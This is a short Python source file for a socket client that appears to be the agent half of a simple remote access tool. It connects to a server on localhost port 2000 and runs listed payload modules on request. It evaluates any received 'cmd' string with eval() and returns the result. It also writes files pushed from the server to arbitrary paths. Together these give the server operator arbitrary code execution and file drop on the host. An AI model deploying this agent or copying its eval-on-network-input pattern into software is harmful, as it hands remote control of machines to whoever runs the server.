from socketHelpers.client import Client
from socketHelpers.packet import Packet

import os


import payloads.test

paylds = [payloads.test]
PAYLOADS = {x.__name__:x for x in paylds}



class Client(Client):
    file_buffer = ""

    def handle(self, packet):
        if packet.get_id() == "execute_list":
            self.send(Packet("execute", str(list(PAYLOADS.keys()))))

        if packet.get_id() == "execute":
            data = PAYLOADS[packet.read()].execute()
            self.send(Packet("info", data))

        if packet.get_id() == "cmd":
            try:
                data = eval(packet.read())
            except Exception as e:
                data = "%s: %s"%(type(e), e)

            self.send(Packet("info", data))

        if packet.get_id() == "new_file":
            name = packet.read()
            self.file_buffer = name

            os.makedirs("." if os.path.dirname(name) == "" else os.path.dirname(name), exist_ok=True)
            with open(name, "w") as f:
                f.close()

            self.send(Packet("info", "Recieving file '%s'."%name))

        if packet.get_id() == "file_data":
            data = packet.read_raw()

            with open(self.file_buffer, "ab") as f:
                f.write(data)
                f.close()




c = Client("localhost", 2000)
c.start()
